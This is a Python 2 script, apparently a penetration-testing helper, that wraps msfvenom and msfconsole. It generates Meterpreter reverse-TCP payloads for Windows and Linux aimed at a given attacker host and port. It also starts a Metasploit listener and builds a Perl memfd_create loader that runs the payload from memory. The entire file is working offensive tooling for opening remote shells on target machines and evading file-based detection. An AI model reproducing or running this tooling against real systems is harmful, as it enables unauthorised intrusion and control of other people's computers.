#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#▌ ▐·▄▄▄ . ▐ ▄       • ▌ ▄ ·.                                                                               #
#▪█·█▌▀▄.▀·•█▌▐█▪     ·██ ▐███▪                                                                             #
#▐█▐█•▐▀▀▪▄▐█▐▐▌ ▄█▀▄ ▐█ ▌▐▌▐█·                                                                             #
#███ ▐█▄▄▌██▐█▌▐█▌.▐▌██ ██▌▐█▌                                                                              #
#. ▀   ▀▀▀ ▀▀ █▪ ▀█▄▀▪▀▀  █▪▀▀▀                                                                             #
#                                                                                                           #
# venom.py - nighter@nighter.se                                                                             #
#                                                                                                           #
# DATE                                                                                                      #
# 14/06/2018                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
#  Just a wrapper around msvenom to simplify payload creation                                               #
#                                                                                                           #
# nighter - nighter@nighter.se                                                                              #
#                                                                                                           #
#############################################################################################################

import random
import getpass
import signal
import time
import sys
import os

from multiprocessing import Process

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def create_perl_mem_payload(type):

    if os.path.isfile('%s_payload' % type) is False:
        print("Missing payload file")
        return False

    payload_file = '%s_payload' % type
    perl_payload_file = '%s_payload.pl' % type

    payload = '''#!/usr/bin/env perl 
use warnings;
use strict;
$|=1;
my $name = "";
my $fd = syscall(319, $name, 1);
if (-1 == $fd) {
   die "memfd_create: $!"; 
}
print "fd $fd\\n";
open(my $FH, '>&='.$fd) or die "open: $!";
select((select($FH), $|=1)[0]);
'''
    with open(perl_payload_file, 'w') as f:
        f.write(payload)

    command = '''perl -e '$/=\\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \\$!/;\\n"while(<>)' %s >> %s''' % (payload_file, perl_payload_file)
    os.system(command)

    payload = '''exec {"/proc/$$/fd/$fd"} "%s" or die "exec: $!";''' % payload_file
    with open(perl_payload_file, 'a') as f:
        f.write(payload)

    print("[+] Saved %s" % perl_payload_file)

def msfvenom(type, lhost, lport):

    if type == 'win64':
        command = "msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_payload" % (lhost, lport, type)
    elif type == 'win32':
        command = "msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > ./%s_payload" % (lhost, lport, type)
    elif type == 'lin64' or type == 'mperl64':
        command = "msfvenom --platform linux -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_payload" % (lhost, lport, type)
    elif type == 'lin32' or type == 'mperl32':
        command = "msfvenom --platform linux -a x86 -p linux/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > ./%s_payload" % (lhost, lport, type)
    else:
        print_usage()

    os.system(command)
    print("[+] Saved %s_payload" % type)

    if type == 'mperl64' or type == 'mperl32':
        create_perl_mem_payload(type)


def listener(type, lhost, lport):

    payload = "use exploit/multi/handler\n"

    if type == 'win64s':
        payload += "set PAYLOAD windows/x64/meterpreter/reverse_tcp\n"
    elif type == 'win32s':
        payload += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
    elif type == 'lin64s':
        payload += "set PAYLOAD linux/x64/meterpreter/reverse_tcp\n"
    elif type == 'lin32s':
        payload += "set PAYLOAD linux/meterpreter/reverse_tcp\n"
    else:
        print_usage()

    payload += "set LHOST %s\n" % lhost
    payload += "set LPORT %s\n" % lport
    payload += "set ExitOnSession false\n"
    payload += "exploit -j -z\n"

    with open('/tmp/meterpreter.rc', 'w') as file:
        file.write(payload)

    command = "msfconsole -r /tmp/meterpreter.rc"
    os.system(command)

def print_usage():
    print ("""
 ▌ ▐·▄▄▄ . ▐ ▄       • ▌ ▄ ·.
▪█·█▌▀▄.▀·•█▌▐█▪     ·██ ▐███▪
▐█▐█•▐▀▀▪▄▐█▐▐▌ ▄█▀▄ ▐█ ▌▐▌▐█·
 ███ ▐█▄▄▌██▐█▌▐█▌.▐▌██ ██▌▐█▌
. ▀   ▀▀▀ ▀▀ █▪ ▀█▄▀▪▀▀  █▪▀▀▀
Simplifies payload creation and listener.

    [Payloads]

    win64    <LHOST> <LPORT>  | x64 Windows payload
    win32    <LHOST> <LPORT>  | x32 Windows payload
    lin64    <LHOST> <LPORT>  | x64 Linux payload
    lin32    <LHOST> <LPORT>  | x32 Linux payload

    [Listen]

    win64s   <LHOST> <LPORT>  | x64 Windows meterpreter listen
    win32s   <LHOST> <LPORT>  | x32 Windows meterpreter listen
    lin64s   <LHOST> <LPORT>  | x64 Linux meterpreter listen
    lin32s   <LHOST> <LPORT>  | x32 Linux meterpreter listen

    [Advanced]
    
    mperl64  <LHOST> <LPORT>  | x64 Linux elf memory inject binary                                               
    mperl32  <LHOST> <LPORT>  | x32 Linux elf memory inject binary

    """)

    sys.exit(0)

if __name__ == '__main__':

    if len(sys.argv) != 4:
        print_usage()

    type = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]

    if type[-1] == 's':
       listener(type, lhost, lport)
       sys.exit(0)

    msfvenom(type, lhost, lport)
